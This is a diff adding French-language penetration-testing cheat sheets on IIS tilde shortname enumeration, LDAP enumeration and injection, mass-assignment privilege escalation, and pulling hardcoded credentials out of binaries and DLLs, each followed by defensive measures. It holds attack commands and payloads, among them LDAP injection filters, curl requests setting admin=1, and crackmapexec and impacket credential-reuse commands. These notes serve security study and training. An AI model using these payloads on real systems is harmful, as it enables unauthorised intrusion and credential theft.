@@ -1139,6 +1139,200 @@ Exploiter ColdFusion 8 : lecture fichiers sensibles (path traversal) et RCE non 
 
 ---
 
+# IIS Tilde Enumeration — Cheat Sheet
+
+## Objectif
+Découvrir noms courts (8.3) et ressources cachées sur IIS via le tilde `~` pour accéder à dossiers/fichiers non exposés.
+
+## Principe rapide
+- Windows génère noms 8.3 (ex: `SECRET~1`) ; IIS accepte `~` dans l’URL.  
+- En testant `http://target/~<prefix>` on peut deviner le shortname ; `200 OK` = match.  
+- Une fois `SECRET~1` trouvé on peut lister/accéder : `http://target/SECRET~1/file.txt`.
+
+## 1) Détection cible
+- Scanner ports / version IIS : `nmap -p- -sV -sC --open <ip>`  
+- Si header `Microsoft-IIS/*` ou version (`7.5`, etc.), tilde enumeration possible.
+
+## 2) Outils rapides
+- `IIS-ShortName-Scanner` (Java) → automatisation découverte 8.3.  
+  - Lancer : `java -jar iis_shortname_scanner.jar 0 5 http://<target>/`  
+  - Résultat : liste de shortnames (ex: `ASPNET~1`, `UPLOAD~1`) et fichiers découverts.
+- Sinon bruteforce manuel + wordlist → `gobuster` :
+  - Générer liste partielle : `egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt`
+  - Brute-force extension adaptée : `gobuster dir -u http://<target>/ -w /tmp/list.txt -x .aspx,.asp`
+
+## 3) Utilisations & impact
+- Trouver pages admin cachées, scripts ASP/ASPX, ressources uploadées.  
+- Permet d’accéder à fichiers non-indexés ou de lancer étapes d’exploitation ultérieures (LFI, RCE, info-leak).
+
+
+## 4) Limitations & contournements
+- Serveurs modernes peuvent désactiver 8.3 ou filtrer `~` requests.  
+- Scanner peut être bruyant → limiter vitesse/threads.  
+- Some hosts block `OPTIONS`/weird methods; use GET.
+
+## 5) Contre-mesures
+- Désactiver noms 8.3 sur filesystem si non requis (`fsutil.exe behavior set disable8dot3 1`).  
+- Filtrer/normaliser requêtes contenant `~` ou patterns 8.3 au WAF.  
+- Restreindre / harden file-listing et directory indexing sur IIS.  
+- Surveillance logs pour requêtes `~` massives.
+
+---
+
+# LDAP
+
+## Objectif  
+Découvrir & exploiter annuaires LDAP/AD : enum, fuite d’attributs, contournement d’auth (LDAP injection), récupération de creds/infos pour pivot.
+
+## 1) Détection rapide
+- Scanner ports : `nmap -p 389,636 -sV <target>` → service LDAP/LDAPS.  
+- Vérifier bannière/version dans résultat nmap.
+
+## 2) Enum basique
+- Test bind anonyme / search :  
+  `ldapsearch -x -H ldap://<ip>:389 -b "dc=example,dc=com" "(objectClass=*)"`  
+- Bind avec creds :  
+  `ldapsearch -H ldap://<ip> -D "cn=admin,dc=example,dc=com" -w 'Passw0rd' -b "dc=example,dc=com" "(cn=*)" `  
+- Chercher utilisateurs :  
+  `ldapsearch -x -b "dc=example,dc=com" "(uid=*)" uid,cn,memberOf,mail`
+
+## 3) Tests utiles
+- Vérifier anonymus bind (si permet lecture) → `ldapsearch -x -H ldap://<ip> -b "dc=..." "(objectClass=person)"`  
+- Lister DNs utiles : `ldapsearch -x -b "dc=example,dc=com" "(objectClass=*)" dn`  
+- Extraire hashes/creds (si stockés) : rechercher `userPassword`, `unicodePwd`, `supplementaryCredentials`.
+
+## 4) LDAP Injection — techniques & payloads
+- Principe : user input concaténé dans filtre LDAP → injection possible (comme SQLi).  
+- Auth bypass (wildcard) : si application construit `(&(objectClass=user)(uid=$user)(userPassword=$pass))` → tester :  
+  - username = `*` → filter `(&(objectClass=user)(uid=*)(userPassword=...))` → peut matcher.  
+  - password = `*` → bypass si password non vérifié côté serveur.  
+- Injection logique (OR) : injecter `) (|(cn=*))` pour transformer filtre. Exemple payload username:  
+  `foo*)(|(objectClass=*))`  
+  (si concaténé sans échappement, devient `(...(uid=foo*)(|(objectClass=*)))...` → retour de multiples entrées)  
+- Filtration/échappement recommandé : échapper `* ( ) \ NUL /` et utiliser binds paramétrés côté application.
+
+## 5) Post-exploitation priorités
+- Récupérer DNs d’admins / groupes sensibles (`memberOf`).  
+- Chercher attributs contenant données sensibles (`userPassword`, `altSecurityIdentities`, `servicePrincipalName`).  
+- Utiliser comptes trouvés pour accéder à services (AD: Kerberos / lateral movement).
+
+## 6) Défenses rapides
+- Désactiver anonymous binds / restreindre lecture par ACL.  
+- Valider/échapper input côté appli (LDAP-escape).  
+- Activer LDAPS / StartTLS pour chiffrer trafic.  
+- Auditer logs et limiter exposition du port LDAP.
+
+---
+
+# Web Mass Assignment Vulnerabilities
+
+## Objectif
+Trouver et exploiter des endpoints qui acceptent des objets complets (mass-assignment) sans whitelist → modifier attributs sensibles (ex : `admin`, `confirmed`, `role`).
+
+## Principe (très court)
+- Frameworks (Rails, Laravel, Django REST, etc.) permettent souvent d’assigner un hash entier aux modèles.  
+- Si l’appli n’utilise pas de whitelist/strong-params, un attaquant envoie des champs non prévus (`admin=true`) et l’attribut est mis à jour.
+
+## Techniques — commande / exploit 
+
+1. Recon — repérer endpoints d’update/create  
+   - Chercher formulaires JSON ou POST qui envoient un objet : `{"user":{...}}` ou `email=...&user[name]=...`  
+   - Outils : Burp intruder / repeater, proxy.
+
+2. Test basique — ajouter attribut sensible au POST  
+   - Exemple HTTP (POST registration) :  
+     - `username=new&password=pass&confirmed=true`  
+   - Si serveur insère `confirmed` sans vérif → contournement d’approbation.
+
+3. Exploitation ciblée — promotion de privilèges  
+   - Souvent utile : ajouter `admin=true`, `role=admin`, `is_staff=true`, `confirmed=1`.  
+   - Test via Burp Repeater ou curl :  
+     - `curl -X POST -d "username=att&password=pass&admin=1" https://target/register`
+
+4. Source-review (si dispo) — repérer assignations massives  
+   - Rails vulnérable : `User.new(params[:user])` sans `permit`.  
+   - Python/Flask example : `Model(**request.form)` → accepter les clefs.
+
+5. Automation / fuzzing des propriétés  
+   - Utiliser wordlists d’attributs courants : `admin, role, is_admin, confirmed, verified, is_staff, balance`  
+   - Burp Intruder ou scripts curl pour injecter chaque clé.
+
+## Prévention
+- Whitelist / strong params :  
+  - Rails : `params.require(:user).permit(:username, :email)`  
+  - Django REST / DRF : serializer fields explicites.  
+  - Laravel : `$fillable` ou `$guarded` correctement configurés.  
+- Ne jamais faire `Model.new(params[:user])` sans filtrage.  
+- Valider côté serveur les champs autorisés (deny-by-default).  
+- Logging / alerting : changements d’attributs sensibles (role, admin, balance).  
+- Tests sécurités (SAST/IAST) pour détecter mass-assignment.
+
+---
+
+# Attacking Applications Connecting to Services 
+
+## Objectif  
+Extraire des credentials ou chaînes de connexion dans des binaires / DLLs d’applis connectées à des services (SQL, LDAP, etc.) pour pivoter ou escalader.
+
+## 1) ELF Executable Analysis (Linux)
+
+### Technique : Analyse dynamique / GDB  
+- Lancer l’appli → observer si elle tente une connexion :  
+  `./octopus_checker`  
+- Charger dans gdb/peda :  
+  `gdb ./octopus_checker`  
+  `set disassembly-flavor intel`
+  `start` 
+  `disas main`  
+- Chercher appels vers fonctions de connexion : `SQLDriverConnect`, `connect`, `mysql_real_connect`, etc.  
+- Poser breakpoint avant la fonction :  
+  `b *<addr>` (ex : `b *0x5555555551b0`)  
+  `run`  
+- Examiner registres pour extraire chaîne de connexion :  
+  `info registers`  
+  → Registre `RDX` ou `RDI` contient souvent :  
+  `"DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost;UID=user;PWD=pass;"`
+
+### Exploit :  
+- Récupérer creds (`UID`, `PWD`, `SERVER`) → tester réutilisation :  
+  - `sqsh -S <server> -U <user> -P <pass>`  
+  - `impacket-mssqlclient <user>:<pass>@<ip>`
+
+## 2) DLL / .NET File Examination (Windows)
+
+### Technique : Lecture du code avec dnSpy  
+- Ouvrir `.dll` suspecte (ex : `MultimasterAPI.dll`) dans **dnSpy**.  
+- Parcourir : *Controllers*, *Config*, *Services*.  
+- Rechercher chaînes sensibles : `connectionString`, `SqlConnection`, `UID=`, `PWD=`.  
+  - Exemple trouvé :  
+    `"Server=localhost,1433;Database=master;User Id=admin;Password=P@ssw0rd!"`
+
+### Exploit :  
+- Tester mot de passe sur d’autres services :  
+  - MSSQL, RDP, SMB, WinRM → **password reuse / lateral movement**.  
+  - `crackmapexec smb <ip> -u user -p 'P@ssw0rd!'`
+
+## 3) Analyse statique alternative
+- Grep sur binaire :  
+  `strings <binary> | grep -Ei "server=|uid=|pwd=|pass"`  
+- Pour ELF + .NET :  
+  `rabin2 -zz <file>`  
+  `binwalk <file>`
+
+## 4) Exploitation & pivoting
+- Se connecter à DB avec creds extraits → exfiltrer users/NTLM hashes.  
+- Vérifier réutilisation du mot de passe (admin, AD, etc.).  
+- Utiliser creds dans outils réseau : `impacket-*`, `crackmapexec`, `mssqlclient`, etc.
+
+## 5) Défense rapide
+- Ne jamais hardcoder les creds dans binaires.  
+- Utiliser gestionnaires de secrets (Vault, Azure Key Vault, etc.).  
+- Restreindre droits des comptes DB utilisés par apps.  
+- Obfuscation / chiffrement des chaînes sensibles dans code.  
+- Rotation régulière des identifiants.
+
+---
+
 
 
 
